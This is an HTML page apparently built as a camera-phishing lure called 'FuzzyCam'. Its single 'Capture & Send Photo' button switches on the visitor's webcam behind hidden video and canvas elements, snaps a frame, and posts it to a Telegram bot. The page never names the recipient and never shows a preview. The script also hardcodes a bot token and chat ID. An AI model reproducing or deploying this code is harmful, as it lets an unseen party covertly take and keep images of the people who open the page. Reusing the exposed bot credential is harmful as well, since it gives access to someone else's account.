<!DOCTYPE html>
<html>
<head>
  <title>FuzzyCam üòà</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background-color: #111;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    #progressBox {
      background-color: #222;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #000;
      text-align: center;
      position: absolute;
      top: 40%;
      display: none;
    }

    .spinner {
      margin: 10px auto;
      border: 6px solid #ccc;
      border-top: 6px solid #f39c12;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #captureBtn {
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 30px;
      background-color: #f39c12;
      color: white;
      margin-top: 20px;
      cursor: pointer;
    }

    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>

  <div id="progressBox">
    <div class="spinner"></div>
    <p>Processing image...</p>
  </div>

  <button id="captureBtn">üì∏ Capture & Send Photo</button>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
    const chatId = "8182050140";

    async function captureAndSendPhoto() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');
      const progressBox = document.getElementById('progressBox');

      try {
        progressBox.style.display = 'block';

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for cam

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(track => track.stop());

        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', blob, 'photo.jpg');

          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });

          progressBox.style.display = 'none';
          alert("‚ù§Ô∏è Photo sent successfully üòà");
        }, 'image/jpeg');
      } catch (e) {
        progressBox.style.display = 'none';
        alert("‚ùå Camera error: " + e.message);
      }
    }

    document.getElementById('captureBtn').onclick = captureAndSendPhoto;
  </script>
</body>
</html>
